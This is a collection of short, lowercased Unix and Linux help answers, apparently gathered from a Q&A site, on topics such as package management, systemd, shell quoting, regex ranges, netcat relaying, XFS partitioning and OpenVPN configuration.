character ) . now , if the current line was empty , and provided the application will have fully read the previously entered lines , the read will return 0 character . that signifies end of file to the application ( when you read from a file , you read until there is nothing more to be read ) . that is why it is called the eof character , because sending it causes the application to see that no more input is available . now , modern shells , at their prompt do not set the terminal in icanon mode because they implement their own line editor which is much more advanced than the terminal driver builtin one . however in their own line editor , to avoid confusing the users , they give the ^D character ( or whatever the terminal 's eof setting is ) the same meaning ( to signify eof ) .
you can reload the repo rpms here : http://rpmfusion.org/Configuration  you probably want to find the version that matches what you have installed and do : yum reinstall packagename 
i did the command service autofs restart once the system booted . i was able to login as the ldap user with the user 's home directory getting mounted from the centralized server . i believe when the system was booting , the nfs was not ready and that is the reason i was getting mount to nfs server failed .
apt-get makes use of dpkg to do the actual package installations . so in a sense they are " installing " to the same place . i would always use apt-get to do any package management since this is the tool that understands how to source packages from remote repositories and provides capabilities for searching the meta data related to packages either locally or remotely . that being said there are times where you will have to make use of dpkg to perform queries against the system to find out information about the packages that are installed . the major reason to use apt tools though is for the dependency management . the apt tools understand that in order to install a given package , other packages may need to be installed too , and apt can download these and install them , whereas dpkg does not .
rather then make this block using /etc/hosts i would suggest using a browser addon/plugin such as this one named : blocksite for firefox or stayfocusd for chrome . blocksite &nbsp ; &nbsp ; stayfocusd &nbsp ; &nbsp ; &nbsp ; &nbsp ; &nbsp ; &nbsp ; &nbsp ; &nbsp ; &nbsp ; &nbsp ; &nbsp ; &nbsp ; &nbsp ; &nbsp ; &nbsp ; &nbsp ; &nbsp ; &nbsp ; &nbsp ; &nbsp ; but i want to really use /etc/hosts file if you must do it this way you can try adding your entries like this instead : 0.0.0.0 www.example.com 0.0.0.0 example.com ::0 www.example.com ::0 example.com  you should never add entries to this file other than hostnames . so do not put any entries in there that include prefixes such as http:// etc .
you can use the alias command . $ alias ll ll='ls --color=auto -Flh' 
$SHELL is not necessarily your current shell , it is the default login shell . to check the shell you are using , try ps $$  that should return something like this if you are running tcsh: 8773 pts/10 00:00:00 tcsh  also make sure you have tcsh set as the default shell , use chsh .
if you do : nc -l -p 7007 | nc -l -p 9001  then anything that comes in to port 7007 will be piped to the second netcat and be relayed to your telnet session on port 9001 . injecting headers requires knowing the underlying protocol , at least to figure out " message " boundaries , so it is not trivial . if you know how to do it , you can inject your code to do so between the two pipes : nc -l -p 7007 | ./my_filter | nc -l -p 9001  ./my_filter will get the input on stdin , and anything it writes to stdout will show up on port 9001 .
to list packages providing mail-transport-agent: make that aptitude search '~Pmail-transport-agent ~i' to only list installed packages ( if any ) . to list all virtual packages provided by currently installed packages : aptitude search '~Rprovides:~i ~v'  see the aptitude manual for an explanation of the search patterns .
like a single command that deletes everything associated with a unit name ? i think you need two commands , one to dissociate the unit and one to erase the unit file . the files and symbol links systemd creates automatically after i run systemd enable you mean systemctl enable ... . anyway , from man systemctl: disable [ name . . . ] disables one or more units . this removes all symlinks to the specified unit files from the unit configuration directory , and hence undoes the changes made by enable . note however that this removes all symlinks to the unit files ( i.e. . including manual additions ) , not just those actually created by enable . this call implicitly reloads the systemd daemon configuration after completing the disabling of the units . note that this command does not implicitly stop the units that is being disabled . the symlinks are there to associate the unit with a target -- this is the same as the symlinks used in sysv rcN.d runlevel directories . 1 disabling a unit removes those , since they are what " enable " it be run with whatever target ( s ) . once those are gone , the only thing that is left is the .service file you presumably created . erase/remove that and you are done . 1 . to be clear : you are not using sysv so if that observation meant nothing to you , do not worry about it . there may be /etc/rcN.d directories on your system , ignore them .
you need patched kernel , losetup and mount . the package is usually called util-linux , you can get the patches from here . if you do not want to boot from a loop-aes device it is really simple : if you want to encrypt the root partition then i recommend reading the extensive documentation . basically you will need to create an initramfs and store it on an unencrypted boot partition . you can store the keyfile . gpg ( and the boot partition if you decide to encrypt the root ) on a removable usb device .
inkscape is today the de facto standard . in earlier times , people used xfig and i still love it , however it is not for the faint of heart as the user interface is disturbingly ugly and unusual ( but highly efficient once you got to know it ) . then there is also dia which is modeled a bit after xfig but with a normal gtk gui .
you can use network manager with a static ip address . if you want a system-wide setting , you can use /etc/network/interfaces for a wireless adapter . the only difference with a wired adapter is that you will need extra settings for the encryption ( unless your wifi network is unencrypted ) . for wpa ( any supported variant ) , use wpa-supplicant . the wpa- parameters are those you could put in a block in wpa_supplicant.conf , with wpa- prefixed . for wep , the wireless-tools package has all you need . instead of the wpa- settings , put wireless- settings , e.g.  wireless-essid chez-jackson wireless-key 0123456789abcdef 
:d i solved the problem : when i openvpned from the client to the server the ssh connection to the router got killed , and the openvpn server got killed too , because i used : openvpn --daemon --config /etc/openvpn/server.conf  and not : nohup openvpn --daemon --config /etc/openvpn/server.conf &gt;/dev/null &amp;  : ) problem solved . now it works perfectly . . :d headshot :d lol .
have a look at the filesystem hierarchy standard ( fhs ) , which is a standard of organising directory structure . i strongly suspect most ( all ? ) linux-based systems more or less follow it .
as you can see , there is fmask option and it is set to 117 . that effectively disables the exec permissions for anyone . if you do not want any restrictions , you may set it to 0 and remount . but please be aware : any restriction here was added to avoid problems and pitfalls .
well depends on the script but easily you can find your crontab as root with crontab -l -u &lt;user&gt;  or you can find crontab from spool where is located file for all users cat /var/spool/cron/crontabs/&lt;user&gt;  to show all users ' crontabs with the username printed at the beginning of each line : cd /var/spool/cron/crontabs/ &amp;&amp; grep . * 
you probably want tail -F ( note that it is capitalised ) , which will retry opening/reading the file if it fails . from man tail: if your version of tail does not have -F ( which is equivalent to tail -f=name --retry ) , you could use inotify , and wait for close_write ( inotifywait is part of inotify-tools ) : file=foo while inotifywait -qq -e close_write "$foo" &gt;/dev/null; do cat "$foo" done &gt; log  tail -F should be preferred if available , because there is a race condition when using inotifywait .
chrome has been in openbsd 's ports tree since at least openbsd 4.8 . $ sudo pkg_add chromium  should do the trick , assuming your pkg_path environment variable is properly set . for more information on ports/packages , see here : openbsd packages and ports system
if i understand your question you are asking how one would go about installing 32-bit packages under a 64-bit system . if this is indeed your question then i believe all one has to do is install the necessary packages that correlate to the architecture of the system . most packages are available in both architectures , for example : so you had need to install the library + headers ( -dev ) you want for a particular library . this would entail installing the lib32.. and lib64.. packages . what is my bit width you can confirm your hardware bitness using this command : $ getconf LONG_BIT 64  and you are oses bitness using this : $ uname -m x86_64  see this u and l q and a where i explain all the methods you can use to do this on various linuxes , titled : 32-bit , 64-bit cpu op-mode on linux . setting up the build environment take a look at this article on the ubuntu website which discusses the gory details of how to setup ones environment for building for different architectures on your main architecture . the topic is titled : installingcompilers - installing the gnu c compiler and gnu c++ compiler .
keybinding can be done using one of the following forms : keyname : command_name " keystroke_sequence": command_name in first form you can spell out the name for a single key . for example , control-u would be written as control-u . this is useful for binding commands to single keys . in the second form , you specify a string that describes a sequence of keys that will be bound to the command . the one you gave as an example is the emacs-tyle backslash escape sequences to represent the special keys \C - control \M - meta \e - escape you can specify a backslash using another backslash – \\ . similarly ' and " can be escaped too - \' and \" update these characters is what is interpreted by your terminal when you press special keys . you do not want to bind regular alphabets and numerics in your key binding as you might be using them on regular basis and can cause issues when you accidentally hit a combination that has been mapped in your ~/.inputrc or /etc/inputrc file . [1~ is what is interpreted by your terminal when you press your HOME button.  to learn more , simply type read on your terminal prompt and press all types of special keys like function keys , home , end , arrow keys etc and see what gets displayed . here is a small reference i found that can offer some basic understanding . good luck ! : )
using sed:  sed -n '/&lt;Document&gt;/,/&lt;\/Document&gt;/ p' yourfile.xml  explanation : -n makes sed silent , meaning it does not output the whole file contents , /pattern/ searches for lines including specified pattern , a , b ( the comma ) tells sed to perform an action on the lines from a to b ( where a and b get defined by matching the above patterns ) , p stands for print and is the action performed on the lines that matched the above . edit : if you had like to additionally strip the whitespace before &lt;Document&gt; , it can be done this way :  sed -ne '/ &lt;Document&gt;/s/^ *//' -e '/&lt;Document&gt;/,/&lt;\/Document&gt;/ p' yourfile.xml 
you can add the files you want to /etc/skel directory . $ sudo touch /etc/skel/test.txt $ sudo useradd -m test $ ls /home/test test.txt  from man useradd:
slacko puppy is larger but includes firefox ISO Size: 165 MB has the latest Firefox browser (other browsers are available through the Package Manager);  lucid puppy is smaller but firefox must be downloaded ISO Size: 132.6 MB allows the user to install his/her favorite browser (user installs it from the Internet at first boot). 
when you use the :! command , a new shell is spawned from within vim . in that shell , the alias is set , but immediately after that , the shell exits , and all is lost . best define the aliases in the shell that starts vim . for environment variables , you can also set them from within vim via :let $VAR = 'value' , and you can use those in :! commands . and you can start a shell from within vim with :shell , or suspend vim and go back to the original shell with :stop or ^z .
the linux kernel itself is all free software , distributed under the gnu general public license . third parties may distribute closed-source drivers in the form of loadable kernel modules . there is some debate as to whether the gpl allows them ; linus torvalds has decreed that proprietary modules are allowed . many device in today 's computer contain a processor and a small amount of volatile memory , and need some code to be loaded into that volatile memory in order to be fully operational . this code is called firmware . note that the difference between a driver and a firmware is that the firmware is running on a different processor . firmware makers often only release a binary blob with no code source . many linux distributions package non-free firmware separately ( or in extreme cases not at all ) , e.g. deb ian .
just a guess but something like this in a file systemd/user/pulseaudio.service: i found this in a github repo which had additional files related to systemd setup . the author of that repo , also wrote up on his blog this post : systemd as a session manager . this post details how to make use of the files in the repo . incidentally the files in the repo go here , ${HOME}/.config/systemd/user/ .
change the character translation in putty to utf-8 .
andy 's answer is correct , as seen in the man page : anchoring the caret ^ and the dollar sign $ are meta-characters that respectively match the empty string at the beginning and end of a line . the reason it works is the -l flag to ls makes it use the long-listing format . the first thing shown in each line is the human-readable permissions for the file , and the first character of that is either d for a directory or - for a file
try ssh -f -L 5901:localhost:5901 server.dog.com -N
most any distro like ubuntu , fedora etc . will probably recognize the card and there are a variety of tools to install them unto usb drives .
since you are using ubuntu why not follow these steps ? http://www.ubuntu.com/download/desktop/create-a-usb-stick-on-ubuntu just point to the centos iso .
try to pipe it to grep: $ grep -E "| a-[0-9]* | HS2 | [0-9]* | [0-9]* |"  to get rid of the first | and the last |: $ grep -Eo " a-[0-9]* \| HS2 \| [0-9]* \| [0-9]* "  "-e " to access the extended regular expression syntax "-o " is used to only output the matching segment of the line , rather than the full contents of the line .
i found the directions for compiling xfreerdp in their github wiki . this would seem to be what you are looking for . https://github.com/freerdp/freerdp/wiki/compilation even though they are marked as being for 1.0.1 i would assume that the steps have not changed all that much .
with filezilla 3.5.2 it works perfectly . with filezilla 3.5.3 it produces the error message above . so it is a bug afaik .
the simplest solution is to use gpt partitioning , a 64-bit version of linux , and xfs : gpt is necessary because the ms-dos-style mbr partition table created by fdisk is limited to 2 tib disks . so , you need to use parted or another gpt-aware partitioning program instead of fdisk . ( gdisk , gparted , etc . ) a 64-bit kernel is necessary because 32-bit kernels limit you to filesystems smaller than you are asking for . you either hit some limit based on 32-bit integers or end up not being able to address enough ram to support the filesystem properly . xfs is not the only possible solution , but in my opinion it is the easiest option for rhel 6 and its derivatives . you might think you could use ext4 , as it is supposed to be able to support 1 eib filesystems . unfortunately , there is an artificial 16 tib volume size limit in the version of e2fsprogs currently shipping with rhel 6 and derivatives like centos . both red hat and centos call this out in their docs . ( the problem was fixed in e2fsprogs 1.42 , but rhel 6 uses 1.41 . ) zfs may not be practical in your situation . because of its several legal and technical restrictions , i can not outright recommend it unless you need something only zfs gives you . having ruled out your two chosen filesystems , i suggest xfs . xfs used to be an experimental feature in rhel oses and so not available in the stock os install , but it is now in all el6 versions and was backported to the later el5 releases . bottom line , here 's what you have to do : install the userland xfs tools : # yum install xfsprogs  if that failed , it is probably because you are on an older os that does not have this in its default package repository . you really should upgrade , but if that is impossible , you can get this from centosplus or epel . in that case , you probably also need to install kmod_xfs . create the partition : if the 22 tib volume is on /dev/sdb , the commands for parted are : # parted /dev/sdb mklabel gpt # parted /dev/sdb mkpart primary xfs 1 -1  that causes it to take over the entire volume with a single partition . actually , it ignores the first 1 mib of the volume , to achieve the 4 kib alignment required to get the full performance from advanced format hdds and ssds . format the partition : # mkfs.xfs -L somelabel /dev/sdb1  add /etc/fstab entry : LABEL=somelabel /some/mount/point xfs defaults 0 0  mount up !  # mount /some/mount/point  if you want to go down the lvm path , the above steps are basically just a more detailed version of the second set of commands in bdowning 's answer . you have to do bdowning 's first set of commands before the ones above . lvm has certain advantages , at a complexity cost . for instance , you can later " grow " an lvm volume group by adding more physical volumes to it , thereby making space to grow the logical volume ( "partition " kinda , sorta ) , which in turn lets you grow the filesystem living on the logical volume . ( see what i mean about complexity ? : ) )
no , this is not normally possible . the only possible way i can think of that this could even be attempted would be to use a fifo or similar and have a process monitoring it to download the file when its accessed .
stripped_path=${path%"$basename"/*}/$basename  use double quotes to do literal string matching as opposed to pattern matching . one of the cases where you need to quote variables . another case is in your : echo $PWD  above which should have been : echo "$PWD"  or even better : printf '%s\\n' "$PWD"  or pwd 
if you use sudoedit to edit your root-owned text files , then your editor will be running as you . sudoedit works by making a temporary copy of the root-owned file ( s ) , owned by you , and invoking your editor ( chosen via $SUDO_EDITOR , $VISUAL , $EDITOR , or the sudoers config file ) on it . when you quit the editor , it copies the temporary file ( s ) back if they are modified . full details are in the man page .
after some more research , i have found that the term swapcached in /proc/meminfo is misleading . in fact , it relates to the number of bytes that are simultaneous in memory and swap , such that if these pages are not dirty , they do not need to be swapped out .
here are a couple : webscarab : http://www.owasp.org/index.php/owasp_webscarab_project burp http://portswigger.net/proxy/
our *nix 's always recommend free formats over the restricted ones . . . see the ogg vorbis format ( lossy ) or flac ( lossless ) . but if you must have your non-free format supported here are guides for a few *nixs ubuntu ubuntu has a detailed guide for installing restricted formats . in particular for recent ubuntu versions it is as simple as opening the terminal , and executing the following command : sudo apt-get install ubuntu-restricted-extras  opensuse opensuse has a page on restricted formats and links to a 5 minute solution to mp3 support that shows you how to install the fluendo mp3 decoder . linuxmint on linuxmint install the " codec mp3 encoding " mint file and you should have mp3 support in soundjuicer . fedora fedora only supports mp3 through third party repositories . and also has a guide to installing fluendo . openbsd the openbsd faq recommends installing lame and states that " lame is included in the openbsd ports tree . " mp3 support included there are some linux distros like slackware that include mp3 support by default .
your laptop should have /sys/class/backlight . for example , /sys/class/backlight/acpi_video0/brightness . you can write ( echo ) values to this file to adjust brightness . cat /sys/class/backlight/acpi_video0/max_brightness &gt; /sys/class/backlight/acpi_video0/brightness  this will set the brightness to max . just put it in an init script on boot .
from within vim: :set ruler  to get it permanently , in your vim configuration file , add it without the :: set ruler 
starting the x program probably starts a background process that does not terminate when you close the program ( or the program itself does not terminate properly ) . see here for an explanation of what happens . to fix this , you can try to find out what processes are still running and either prevent them from being started when you log in via ssh or simply kill them before you log out . you can certainly just kill the ssh connection once you have logged out as well though .
a quick and dirty fix , was hack the dpkg records , since /usr/share/gnome-background-properties/linuxmint-lisa.xml belongs two packages , you are going to remove it from one , goto /var/lib/dpkg/info/mint-artwork-kde.list , remove that xml filename from the file . and redo apt-get -f install notice in the future this package conflicts will be solved by the packager ( let 's hope ) , and later updates will not be affected .
i do not think that is possible . it is a gnome keyring goal though : storage of keys and certificates on removable media build a pkcs#11 module which allows storage of keys , certificates , and passwords on removable media . this can be used as a poor man 's smart card , or for mobility . task : not yet implemented .
in your server config , " listen localhost " is wrong . that would listen on 127.0.0.1 ( or similar ) , meaning it would not accept connections from outside the box . your comment next to it does not make sense either ; and also , you had normally listen on a public ip . assuming the above is anonimizing ( which you forgot to do in the client config ) : the ; comments are ok ( thanks to tnw for pointing this out ) . its somewhat weird that your server config does not give the path to the ca , key , and certificate . possibly its not finding them ? you have a host firewall on your server ( or somewhere inbetween ) that is blocking the packet to udp/1194 . you did not actually start the server ( possibly due to some error in the config—maybe one of the above—preventing it from starting , but you did not provide a server log ) . further , glancing quickly at the config : you push "dhcp-option DNS 4.2.2.1 " . . . you probably should not do that . you had typically only push a dns server if you were pushing a private one , to be accessed over the vpn ( so clients could use internal hostnames ) . and if you want a generic public dns server , google actually offers a few—4.2.2.1 is not offered as such ( at least not officially ) . you ought to heed that warning about mitm attacks in your client log , and read http://openvpn.net/index.php/open-source/documentation/howto.html#mitm like it says . it may not apply since you are probably using a private ca—at least , if you trust everyone the private ca has given a certificate to .
looking at man gmetad , you will probably find -d, --debug=INT Debug level. If greater than zero, daemon will stay in foreground. (default='0')  so using commandline argument , e.g. gmetad -d 1 , should do the trick .
you can define a new ' tunnel ' in your subversion configuration ( ~/.subversion/config ) . find the section [tunnels] there and define something like : [tunnels] foo = ssh -p 20000  afterwards you can contact your repository via the url svn+foo://server.com/home/svn/proj1 proj1 .
history originally , unix only had permissions for the owning user , and for other users : there were no groups . see the documentation of unix version 1 , in particular chmod(1) . so backward compatibility , if nothing else , requires permissions for the owning user . groups came later . acls allowing involving more than one group in the permissions of a file came much later . expressive power having three permissions for a file allows finer-grained permissions than having just two , at a very low cost ( a lot lower than acls ) . for example , a file can have mode rw-r-----: writable only by the owning user , readable by a group . another use case is setuid executables that are only executable by one group . for example , a program with mode rwsr-x--- owned by root:admin allows only users in the admin group to run that program as root . “there are permissions that this scheme cannot express” is a terrible argument against it . the applicable criterion is , are there enough common expressible cases that justify the cost ? in this instance , the cost is minimal , especially given the other reasons for the user/group/other triptych . simplicity having one group per user has a small but not insignificant management overhead . it is good that the extremely common case of a private file does not depend on this . an application that creates a private file ( e . g . an email delivery program ) knows that all it needs to do is give the file the mode 600 . it does not need to traverse the group database looking for the group that only contains the user — and what to do if there is no such group or more than one ? coming from another direction , suppose you see a file and you want to audit its permissions ( i.e. . check that they are what they should be ) . it is a lot easier when you can go “only accessible to the user , fine , next” than when you need to trace through group definitions . ( such complexity is the bane of systems that make heavy use of advanced features such as acls or capabilities . ) orthogonality each process performs filesystem accesses as a particular user and a particular group ( with more complicated rules on modern unices , which support supplementary groups ) . the user is used for a lot of things , including testing for root ( uid 0 ) and signal delivery permission ( user-based ) . there is a natural symmetry between distinguishing users and groups in process permissions and distinguishing users and groups in filesystem permissions .
no , not the way you are trying to do it . root has access to every file on the system . you can make it harder to modify the file ( note : it has to be publicly readable ) , but if you have root access , you can not prevent yourself from modifying it . there is no password protection feature for files . even if there was one , being root , you could remove it . ( you can encrypt a file , but that makes it unreadable . ) one way to make it harder to modify the file is to set the immutable attribute : chattr +i /etc/resolv.conf . then the only way to modify it will involve running chattr -i /etc/resolv.conf . ( or going to a lower level and modifying the disk content — with a very high risk of erasing your data if you do it wrong . ) if you want to put a difficult-to-bypass filter on your web browsing , do it in a separate router box . let someone else configure it and do not let them give you the administrator password .
ssh_host_key is the private key if you use the sshv1 protocol and ssh_host_key.pub is the matching public key . it should be a rsa key . if you use sshv2 you chose between multiple signing algorithms like dsa , rsa and ecdsa and then the ssh_host_ecdsa_key and etc are used .
from man 7 regex: a bracket expression is a list of characters enclosed in " [ ] " . … … to include a literal '-' , make it the first or last character… . [ a ] ll other special characters , including '\' , lose their special significance within a bracket expression . trying the regexp with egrep gives an error : $ echo "username : username usergroup" | egrep "^([a-zA-Z0-9\-_]+ : [a-zA-Z0-9\-_]+) (usergroup)$" egrep: Invalid range end  here is a simpler version , that also gives an error : $ echo 'hi' | egrep '[\-_]' egrep: Invalid range end  since \ is not special , that is a range , just like [a-z] would be . you need to put your - at the end , like [_-] or : echo "username : username usergroup" | egrep "^([a-zA-Z0-9_-]+ : [a-zA-Z0-9_-]+) (usergroup)$" username : username usergroup  this should work regardless of your libc version ( in either egrep or bash ) . edit : this actually depends on your locale settings too . the manpage does warn about this : ranges are very collating-sequence-dependent , and portable programs should avoid relying on them . for example : $ echo '\_' | LC_ALL=en_US.UTF8 egrep '[\-_]' egrep: Invalid range end $ echo '\_' | LC_ALL=C egrep '[\-_]' \_  of course , even though it did not error , it is not doing what you want : $ echo '\^_' | LC_ALL=C egrep '^[\-_]+$' \^_  it is a range , which in ascii , includes \ , [ , ^ , and _ .
i found this one annoyance of the free desktop at present is the use of incompatible systems for storing sensitive user data such as passwords . every web browser may have its own password store and anyone using both kde and gnome applications will likely have to open both kwallet and gnome keyring in every desktop session . michael leupold presented a collaboration between kde and gnome to develop a unified standard for storing secrets . the aim is that kde and gnome applications will both be able to share a common secrets architecture but still have separate graphical interfaces . a kde user will be presented with a kde interface if they need to unlock an account in empathy ( the gnome instant messaging application ) while a gnome user will see a gnome interface for password management even if they prefer to chat using kde 's kopete . it is also hoped that the standard will attract the support of other vendors , such as mozilla . this seems older , but might be a link to the actual project ? after having hinted at it now and then , i can finally gladly announced that we ( gnome keyring + kde wallet ) managed to kick off a joint freedesktop . org project with the goal of creating a common infrastructure ( or more technically : protocol ) for managing passwords and other secret values .
do not use ls . for f in mydir/*.jpg do convert -thumbnail "$size" -quality "$quality" "$f" "thumbsdir/$(basename "$f")" done  and you do need the quotes .
by stopping the denyhosts service , you prevent new entries from being created in /etc/hosts.deny , but entries that are already there remain . you will need manually remove the ip from the hosts.deny folder . to prevent the ip from being added again , you need to whitelist it in the allowed-hosts file .
i found this paragraph in a withdrawal letter for fips which might be why it was withdrawn : excerpt from withdrawal letter it is no longer necessary for the government to mandate standards that duplicate industry standards . federal government departments and agencies are directed by the national technology transfer and advancement act of 1995 ( p . l . 104-113 ) , to use technical industry standards that are developed in voluntary consensus standards bodies . there is also this letter/email :  From: "richard l. hogan" &lt;Richard=L.=Hogan%dpi%hqnmd@mcmcban6.er.usgs.gov&gt; Date: Tue, 29 Oct 96 9:20:26 CST Subject: Withdrawal of FIPS  which discusses that the nist and the dept . of commerce were dropping national designations for things such as ansi 3.64 when they already had a international designation ( iso ) . excerpt from that letter/email one of the pieces of legislation that , according to nist and the department of commerce , enabled the fips program was rescinded this year . the law - sometimes referred to as the brooks act - contained specific requirements for establishing uniform standards for information processing in the federal government and for making those standards mandatory in federal procurement actions . omb circular a-119 further clarified that mandatory federal standards took precedence over voluntary national and international standards . now , as a result of treaty negotiations making the untied states part of the world trade organization , the books act has been replaced with new legislation that requires federal agencies to consider voluntary international and national standards first in procurement actions and to cite federal standards only when no appropriate international or national standards exist . in many cases fips have international ( iso ) or national ( ansi ) standard equivalents . for example , fips 123 ( data descriptive format for information interchange ) is also iso-8211 . the change in legislation requires federal procurements to now cite iso-8211 . previously , we were required to cite fips- 123 . as a result of this change , nist has recognized an opportunity to make government " work better and cost less " by withdrawing any fips that already has an equivalent ansi or iso specification or any fips that is not mandatory ; i.e. , is just a guideline . what remains on the " active " fips list are mandatory federal standards which currently have no ansi or iso equivalent ; for example , the spatial data transfer standard ( fips 173-1 ) and the government information locator service ( fips 192 ) . nist is not withdrawing important standards like pascal , fips 109 ; sgml , fips 152 ; or hydrologic unit codes , fips 103 . the proper way to look at this action is that nist is withdrawing the federal designation of these standards in favor or their national or international standards designations ; ansi x3.97-1993 for fips 103 , iso 8879 for fips 152 , and ansi x3.145-1986 for fips 103 . from a user point of view , this action by nist is nothing more than a way to assure the designation change required by the new legislation . i would interpret this as follows : since ecma-48 already covered the standard at an international level there was no need to create redundant standards within ansi .
i do not see a way to do it from the man page , but you can always filter the results . the following assumes no newlines in your file names : tar tzf your_archive | awk -F/ '{ if($NF != "") print $NF }'  how it works by setting the field separator to / , the last field awk knows about ( $NF ) is either the file name if it is processing a file name or empty if it is processing a directory name ( tar adds a trailing slash to directory names ) . so , we are basically telling awk to print the last field if it is not empty .
from the output you have given , you are trying to compile a 32-bit build of apache on a 64 bit system . this is from the intput to configure here : --host=x86_32-unknown-linux-gnu host_alias=x86_32-unknown-linux-gnu CFLAGS=-m32 LDFLAGS=-m32  also see the output lines confirming this : here it is using a 64 bit build system but a 32 bit host/target . further down we see : ac_cv_env_CFLAGS_set=set ac_cv_env_CFLAGS_value=-m32  this flag tells gcc to produce 32 bit objects . your error that the c compiler cannot produce executable is likely caused by not having a 32 bit toolchain present . testing your ability to compile 32 bit objects you can test this by compiling a small c example with the -m32 flag . // Minimal C example #include &lt;stdio.h&gt; int main() { printf("This works\\n"); return 0; }  compiling : gcc -m32 -o m32test m32test.c  if this command fails , then you have a problem with your compiler being able to build 32 bit objects . the error messages emitted from the compiler may be helpful in remedying this . remedies build for a 64 bit target ( by removing the configure options forcing a 32 bit build ) , or install a 32 bit compiler toolchain
1 ) is not the next kernel 's release maintaining everything than was included in previous release ? if you mean everything then the answer will always be : " not everything " because there were changes . 2 ) if not what is the purpose of naming a kernel with higher number if it is not having a content of previous one ( like in apps ) there is often a term used feature stop , so a new patchlevel ( 15 ) will introduce new features . these features depend many other distribution specific userland tools . 3 ) why there has to be so many kernels maintained at the same time , would not e.g. 2 lts and one or two regular ones be enough ? there are a lot more kernels i.e. kernels for android , which are not maintained at kernel . org . the reason is , that on the one hand there are a lot of people who want to implement new features . features that belong to new , state of the art technology or drivers for brand new hardware . on the other hand , there are a lot of people who wants to bugfix current kernels and want to have stable software .
of course it is possible . the configuration you might want to try is tap rather than tun if you wonder about that , even though it might bit a bit harder to configure , it is easier to get hosts together in one network that way . you might need to enable client-to-client connections for that - there is a line for that commented out in example openvpn configs . your error is another matter , though . it means that the program using port 1194 ( openvpn in that case ) is already running , so you have to specify some other port in config , or make sure that the previous instance is off if it should not be on . ps ax | grep openvpn  if there is openvpn running and should not be , and it has pid of , say , 1234 ( first number on the left ) you can type kill 1234 to turn it off .
the acpi block depends on pci being enabled . Symbol: ACPI [=y] ... Depends on: !IA64_HP_SIM &amp;&amp; (IA64 || X86 [=y]) &amp;&amp; PCI [=y]  if you disabled pci ( or did not enable it ) , or selected a different architecture , you will not see any options related to acpi .
you can use usb-creator-kde to transfer the ubuntu installation iso to a usb stick . the correct suse package name to install is usb-creator .
sed explanation : ps . put echo before every mv to run in dry mode and verify everything looks fine . pps . also sed construction expects , that fdjskjfls is on the one line and does not have any tags before on the same line .
i have always used unetbootin to do these types of installations . it is a standalone executable so there is not anything to install , simply download it and run . &nbsp ; &nbsp ; &nbsp ; &nbsp ; &nbsp ; &nbsp ; &nbsp ; &nbsp ; &nbsp ; &nbsp ; &nbsp ; &nbsp ; &nbsp ; &nbsp ; &nbsp ; &nbsp ; &nbsp ; &nbsp ; &nbsp ; &nbsp ; &nbsp ; &nbsp ;
perl -pe 's/begin\/$&amp;. ++$n/ge' &lt; input-file  or for in-place editing ( that is replace the file with the modified copy of itself ) : perl -pi.back -e 's/begin\/$&amp;. ++$n/ge' input-and-output-file  ( remove the .back if you are feeling adventurous and do not need a backup ) . the above replaces ever begin with the same ( $&amp; ) with the incremented value of the $n variable ( ++$n ) appended ( . ) . if you want to replace begin() instead of begin: perl -pe 's/begin\(\K\)/++$n.")"/ge' &lt; input-file 
you can use xvfb , which is x server with a virtual framebuffer , i.e. an x server that displays only in memory and does not connect to any hardware . you do not need to run any client you do not want on that server , and in particular no desktop environment or window manager . Xvfb :1 -screen 0 1x1x8 &amp;  after this : DISPLAY=:1 dbus-launch DISPLAY=:1 pulseaudio --start  you need to wait a little after starting Xvfb for the display to be available . you can use xinit to start an x server and then start clients when it is ready . put the commands you want to run in a script ( note that when the script exits , the x server exits ) : #!/bin/sh dbus-launch pulseaudio --start sleep 99999999  start the virtual x server with xinit /path/to/client.script -- /usr/bin/Xvfb :1 -screen 0 1x1x8  if you want to run it at boot time , you can start it from cron . run crontab -e ( as your user , not as root ) and add the line @reboot xinit /path/to/client.script -- Xvfb :1 -screen 0 1x1x8  if you want to kill this session , kill the xinit process .
with awk awk '{sub(/\..*/,"",$2);$0=$1 " "$2}1' foo.txt  with sed sed 's/^\(\([^.]*\.\)\{4\}\).*$/\1/;s/\.$//' foo.txt 
you should add the shebang line at the beginning of your script . #!/bin/csh  so that it will be executed with the /bin/csh and not with the /bin/sh . the error looks like your script is executed with sh .
i am pretty sure this should be doable using gentoo prefix . usually , gentoo 's portage installs in the root of the filesystem hierarchy , '/' . on systems other than gentoo linux , this usually results in problems , due to conflicts of software packages , unless the os is adapted like gentoo/freebsd . instead , gentoo prefix installs with an offset , allowing to install in another location in the filesystem hierarchy , hence avoiding conflicts . next to this offset , gentoo prefix runs unprivileged , meaning no root user or rights are required to use it .
very strange . on my work dell e6510 the bluetooth shows up as an " internal " usb device ( visible with lspci ) and i have no problems with it . try to see if you can get to the gateway site where it allows you to download the windows driver , and see if that tells you what kind of chipset/etc . it might be . otherwise you might have to take the back cover off and physically look at the chip .
i think the at command is what you are after . e.g. : echo "mail -s Test mstumm &lt; /etc/group" | at 16:30  this will e-mail you a copy of /etc/group at 4:30 pm . you can read more about at here : http://www.softpanorama.org/utilities/at.shtml
well , in the vi spirit , you had call a command to do it like : :%!column -ts:  ( if you have column and it supports the -s option ) . otherwise you could do : :%s/[^:]\+/ &amp;/g :%s/\v^ *([^:]{20}): *([^:]{16}): *([^:]{5})/\1:\2:\3/ 
here is a breakdown of the command . first the original command , for reference g++ -Wall -I/usr/local/include/thrift *.cpp -lthrift -o something  now , for the breakdown . g++  this is the actual command command , g++ . it is the program that is being executed . here is what it is , from the man page : gcc - gnu project c and c++ compiler this is a compiler for programs written in c++ and c . it takes c or c++ code and turns it into a program , basically . -Wall  this part makes it display all warnings when compiling . ( warn all ) -I/usr/local/include/thrift  this part tells g++ to use /usr/local/include/thrift as the directory to get the header files from . and with the question about whether to put a space after the i or not . you can do it either way . the way the options ( options are things in a command after - signs . -Wall and -I are options ) are parsed allows you to put a space or not . it depends on your personal preference . *.cpp  this part passes every .cpp file in the current directory to the g++ command . -lthrift  this can also be -l thrift . it tells g++ to search the thrift library when linking . -o something  this tells it that when everything is compiled to place the executable in the file something . i hope this helps and please comment if anything is unclear !
you probably have some non-printable characters on end of lines ( eg . crlf from windows ) , run : cat -A scriptname  on remote machine , it'll show you all characters in your script . then , you can convert to unix-like format running dos2unix scriptname 
if xev does not register a response for a particular keypress , then you can try at the next level down with showkey , a command that must be issued from the console . if showkey provides not information about a keypress , your final option is to see if it is registering with the kernel ; follow the instructions on the arch linux wiki multimedia keys page , and check for a scancode by seeing what is printed ( if anything ) to dmesg after a keypress . if none of the above approaches return a result for the key , then it is not accessible in linux .
